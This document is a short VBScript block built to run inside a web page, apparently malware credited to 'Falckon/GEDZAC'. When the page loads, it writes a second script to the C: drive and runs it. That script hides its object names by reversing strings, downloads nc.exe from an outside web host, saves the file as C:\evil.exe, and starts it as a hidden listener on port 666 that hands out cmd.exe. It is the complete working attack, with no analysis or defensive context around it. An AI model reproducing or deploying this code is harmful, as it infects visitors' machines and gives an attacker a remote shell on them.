<script language=vbscript>
On Error Resume next
Dim Z,Z1,Z2
Set Z = CreateObject("Scripting.FileSystemObject")
Set Z2 = CreateObject("Wscript.Shell")
Set Z1 = Z.CreateTextFile("C:\-.vbs")
Z1.WriteLine "On Error Resume Next" + vbCrLf + _
"'// this code was modified by Falckon/GEDZAC //" + vbCrLf + _
"'// i have new ideas for my Poly VBS virus! :D //" + vbCrLf + _
"Dim MSxml,P1,P2,P3" + vbCrLf + _
"Set MSxml = CreateObject(strReverse(" + Chr(34) + "PTTHLMX.tfosorciM" + Chr(34) +"))" + vbCrLf + _
"   MSxml.Open strReverse(" + Chr(34) + "TEG" + Chr(34) + ")," + Chr(34) +"http://www.gratisweb.com/falckon/nc.exe"+ Chr(34) + ",false" + vbCrLf + _
"   MSxml.Send" + vbCrLf + _
"        P1 = MSxml.responseBody" + vbCrLf + _
"        Set P2 = CreateObject(strReverse(" + Chr(34) + "maertS.BDODA" + Chr(34) + "))" + vbCrLf + _
"    P2.Mode = 3 : P2.Type = 1 : P2.Open" + vbCrLf + _
"  P2.Write(P1) : P2.SaveToFile " + Chr(34) +"C:\evil.exe"+ Chr(34) + ", 2" + vbCrLf + _
"  Set P3 = CreateObject(" + Chr(34) +"Wscript.Shell" + Chr(34) +")" + vbCrLf + _
"P3.run"+chr(34)+"C:\evil.exe "+chr(34)+chr(43)+" "+chr(34)+"-L -p 666 -d -e cmd.exe"+chr(34)
Z1.close
Z2.run "C:\-.vbs"
</script>